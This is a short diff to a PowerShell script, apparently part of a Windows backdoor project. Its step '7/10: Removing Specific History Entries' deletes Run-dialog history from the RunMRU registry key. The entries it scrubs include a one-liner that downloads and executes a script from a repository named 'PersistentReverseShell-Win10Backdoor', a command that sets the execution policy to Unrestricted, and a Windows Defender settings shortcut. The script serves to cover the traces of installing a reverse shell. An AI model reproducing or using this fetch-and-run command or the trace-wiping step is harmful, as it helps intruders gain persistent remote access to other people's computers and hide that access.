@@ -75,7 +75,7 @@ Write-Host "7/10: Removing Specific History Entries..."
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 $runMRUEntries = Get-ItemProperty -Path $registryPath
 $stringsToDelete = @(
-    "powershell.exe -nop -ep bypass -c IEX(IWR https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/ncinstallerdebug.ps1 -UseBasicParsing);",
+    "powershell.exe IEX(IWR https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/ncinstallerdebug.ps1 -UseBasicParsing);",
     "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force",
     "ms-settings:windowsdefender"
 )
